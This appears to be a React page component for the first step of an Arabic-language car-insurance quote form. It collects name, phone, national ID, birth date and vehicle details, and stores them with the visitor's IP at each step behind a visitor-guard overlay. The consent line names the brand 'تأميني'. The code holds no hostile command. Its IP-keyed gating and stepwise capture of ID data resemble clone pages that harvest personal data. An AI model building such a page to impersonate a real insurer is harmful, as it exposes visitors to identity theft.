import React, { useState, useCallback } from "react";
import { useLocation } from "wouter";
import InsuranceHeader from "@/components/InsuranceHeader";
import InsuranceStepper from "@/components/InsuranceStepper";
import LoadingOverlay from "@/components/LoadingOverlay";
import StepLoadingScreen from "@/components/StepLoadingScreen";
import { trpc } from "@/lib/trpc";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { useVisitorGuard } from "@/hooks/useVisitorGuard";

export default function Step1BasicInfo() {
  const [, navigate] = useLocation();
  const { sessionId, visitorIp, saveData, getStoredData } = useVisitorSession();
  const guard = useVisitorGuard(visitorIp);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);

  const stored = getStoredData();
  const [offerType, setOfferType] = useState<string>((stored.offerType as string) ?? "new");
  const [regType, setRegType] = useState<string>((stored.regType as string) ?? "serial");
  const [userName, setUserName] = useState<string>((stored.userName as string) ?? "");
  const [phoneNumber, setPhoneNumber] = useState<string>((stored.phoneNumber as string) ?? "");
  const [idNumber, setIdNumber] = useState<string>((stored.idNumber as string) ?? "");
  const [birthDate, setBirthDate] = useState<string>((stored.birthDate as string) ?? "");
  const [serialNumber, setSerialNumber] = useState<string>((stored.serialNumber as string) ?? "");
  const [carYear, setCarYear] = useState<string>((stored.carYear as string) ?? "");

  const upsertMutation = trpc.insurance.upsert.useMutation();

  function validate() {
    const errs: Record<string, string> = {};
    if (!userName.trim()) errs.userName = "الاسم الكامل مطلوب";
    if (!phoneNumber.match(/^05\d{8}$/)) errs.phoneNumber = "رقم الهاتف غير صحيح (يجب أن يبدأ بـ 05)";
    if (!idNumber.match(/^\d{10}$/)) errs.idNumber = "رقم الهوية يجب أن يكون 10 أرقام";
    if (!serialNumber.trim()) errs.serialNumber = "الرقم التسلسلي مطلوب";
    if (offerType === "transfer" && !birthDate) errs.birthDate = "تاريخ الميلاد مطلوب";
    if (offerType === "transfer" && !carYear) errs.carYear = "سنة الصنع مطلوبة";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validate()) return;
    setIsLoading(true);
    const data = { offerType, regType, userName, phoneNumber, idNumber, birthDate, serialNumber, carYear };
    saveData(data);
    await upsertMutation.mutateAsync({ sessionId, visitorIp, ...data, currentStep: 2 });
    setTimeout(() => {
      setIsLoading(false);
      navigate("/insurance/step2");
    }, 800);
  }

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
        <InsuranceHeader showLogin />
        <InsuranceStepper currentStep={1} />
        <main className="flex-1 px-4 py-5">
          <h1 className="text-lg font-bold mb-4 text-gray-800">الغرض من التأمين</h1>
          <form onSubmit={handleSubmit} noValidate>
            <label className="block text-sm text-gray-600 mb-1.5">نوع العرض</label>
            <div className="segmented mb-4">
              <button type="button" className={offerType === "new" ? "active" : ""} onClick={() => setOfferType("new")}>تأمين جديد</button>
              <button type="button" className={offerType === "transfer" ? "active" : ""} onClick={() => setOfferType("transfer")}>نقل الملكية</button>
            </div>

            <label className="block text-sm text-gray-600 mb-1.5">نوع تسجيل المركبة</label>
            <div className="segmented mb-4">
              <button type="button" className={regType === "serial" ? "active" : ""} onClick={() => setRegType("serial")}>الرقم التسلسلي</button>
              <button type="button" className={regType === "customs" ? "active" : ""} onClick={() => setRegType("customs")}>بطاقة جمركية [استيراد]</button>
            </div>

            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">الاسم الكامل</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-200" placeholder="أدخل اسمك الكامل" value={userName} onChange={e => setUserName(e.target.value)} />
              {errors.userName && <p className="text-red-500 text-xs mt-1">{errors.userName}</p>}
            </div>

            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">رقم الهاتف</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="05xxxxxxxx" type="tel" maxLength={10} value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} style={{ direction: "ltr", textAlign: "right" }} />
              {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
            </div>

            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">رقم الهوية</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="رقم الهوية الوطنية أو الإقامة أو الشركة" maxLength={10} inputMode="numeric" value={idNumber} onChange={e => setIdNumber(e.target.value)} />
              {errors.idNumber && <p className="text-red-500 text-xs mt-1">{errors.idNumber}</p>}
            </div>

            {offerType === "transfer" && (
              <div className="mb-3.5">
                <label className="block text-sm text-gray-600 mb-1">تاريخ الميلاد</label>
                <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" type="date" value={birthDate} onChange={e => setBirthDate(e.target.value)} />
                {errors.birthDate && <p className="text-red-500 text-xs mt-1">{errors.birthDate}</p>}
              </div>
            )}

            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">الرقم التسلسلي</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="الرقم التسلسلي للمركبة" value={serialNumber} onChange={e => setSerialNumber(e.target.value)} />
              {errors.serialNumber && <p className="text-red-500 text-xs mt-1">{errors.serialNumber}</p>}
            </div>

            {offerType === "transfer" && (
              <div className="mb-3.5">
                <label className="block text-sm text-gray-600 mb-1">سنة الصنع</label>
                <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="اختر سنة الصنع" type="number" value={carYear} onChange={e => setCarYear(e.target.value)} />
                {errors.carYear && <p className="text-red-500 text-xs mt-1">{errors.carYear}</p>}
              </div>
            )}

            <p className="text-xs text-gray-500 mt-2 mb-5 leading-relaxed">
              بالضغط على التالي، أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل إصدار التسعيرة.
            </p>

            <button type="submit" className="w-full py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all">
              التالي
            </button>
          </form>
        </main>
        <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        <StepLoadingScreen show={isLoading} />
      </div>
    </div>
  );
}
